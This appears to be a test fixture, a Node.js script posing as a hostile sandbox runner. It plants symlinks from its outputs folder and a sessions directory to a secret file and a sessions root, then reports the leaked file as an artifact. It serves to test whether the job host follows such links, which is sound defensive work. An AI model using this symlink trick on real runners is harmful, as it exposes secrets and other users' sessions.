// A runner that attacks the job from inside the sandbox without reading any
// secret itself: it leaves symlinks for the job to follow. SECRET_FILE and
// SESSIONS_ROOT are base64, so the fake CLI does not rewrite them as paths.
//
//   leak.txt   -> SECRET_FILE, reported as an output
//   .sessions  -> SESSIONS_ROOT, so a save would archive every thread's session

import { mkdirSync, rmSync, symlinkSync } from "node:fs";

let seq = 0;
const emit = (type, payload) =>
  process.stdout.write(`${JSON.stringify({ seq: seq++, ts: new Date().toISOString(), type, payload })}\n`);
const decode = (value) => Buffer.from(value, "base64").toString();

mkdirSync("outputs", { recursive: true });
symlinkSync(decode(process.env.SECRET_FILE), "outputs/leak.txt");
rmSync(".sessions", { recursive: true, force: true });
symlinkSync(decode(process.env.SESSIONS_ROOT), ".sessions");
emit("run_started", {});
emit("artifact", { path: "/workspace/outputs/leak.txt", kind: "report", caption: "secret" });
await new Promise((resolve) => setTimeout(resolve, 300));
emit("run_finished", { status: "succeeded" });
